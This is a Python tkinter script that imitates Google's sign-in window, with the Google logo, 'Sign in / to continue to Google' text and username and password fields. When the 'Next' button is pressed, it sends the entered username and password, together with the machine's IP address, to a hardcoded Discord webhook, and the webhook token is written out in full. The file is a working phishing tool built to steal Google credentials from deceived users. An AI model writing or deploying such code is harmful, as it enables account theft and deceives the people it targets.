import tkinter as tk
from tkinter import messagebox
import requests
import socket
from PIL import Image, ImageTk

# Function to get the local IP address
def get_ip_address():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address

# Function to send data to a Discord channel via webhook
def send_to_discord(webhook_url, username, password, ip_address):
    data = {
        "content": f"Username: {username}\nPassword: {password}\nIP Address: {ip_address}"
    }
    response = requests.post(webhook_url, json=data)
    return response.status_code == 204

# Function to handle button click
def on_submit():
    username = entry_username.get()
    password = entry_password.get()
    if not username or not password:
        status_label.config(text="Please enter both username and password.", fg="red")
        return
    ip_address = get_ip_address()
    webhook_url = "https://discord.com/api/webhooks/1267003782257184808/uoDAZCsP1aKXB4VGZWV0terhCFPJcw69M3nuFC2XxxZ5Nx30pAMTS72lOw7EzqE21sCf"
    if send_to_discord(webhook_url, username, password, ip_address):
        status_label.config(text="Message sent successfully to Discord!", fg="green")
    else:
        status_label.config(text="Failed to send message.", fg="red")

# Setting up the GUI
root = tk.Tk()
root.title("Google Login")

# Set the window size and make it unresizable
root.geometry("400x500")
root.resizable(False, False)

# Create a frame for the main content
frame = tk.Frame(root, bg="white")
frame.place(relwidth=1, relheight=1)

# Google logo
logo_img = Image.open("google_logo.png")  # Ensure you have a Google logo image file named 'google_logo.png'
logo_img = logo_img.resize((100, 100), Image.LANCZOS)
logo = ImageTk.PhotoImage(logo_img)
logo_label = tk.Label(frame, image=logo, bg="white")
logo_label.pack(pady=20)

# Title
title_label = tk.Label(frame, text="Sign in", font=("Arial", 24), bg="white")
title_label.pack(pady=10)

# Subtitle
subtitle_label = tk.Label(frame, text="to continue to Google", font=("Arial", 12), bg="white", fg="grey")
subtitle_label.pack(pady=5)

# Username entry
entry_username = tk.Entry(frame, font=("Arial", 14), borderwidth=1, relief="solid")
entry_username.pack(pady=10, padx=20, ipady=5, fill=tk.X)

# Password entry
entry_password = tk.Entry(frame, show="*", font=("Arial", 14), borderwidth=1, relief="solid")
entry_password.pack(pady=10, padx=20, ipady=5, fill=tk.X)

# Submit button
submit_button = tk.Button(frame, text="Next", command=on_submit, font=("Arial", 14), bg="#4285F4", fg="white", borderwidth=0)
submit_button.pack(pady=20, padx=20, ipady=10, fill=tk.X)

# Status label
status_label = tk.Label(frame, text="", font=("Arial", 10), bg="white", fg="red")
status_label.pack(pady=5)

# Additional text
help_text = tk.Label(frame, text="Not your computer? Use Guest mode to sign in privately.", font=("Arial", 10), bg="white", fg="grey")
help_text.pack(pady=5)

root.mainloop()
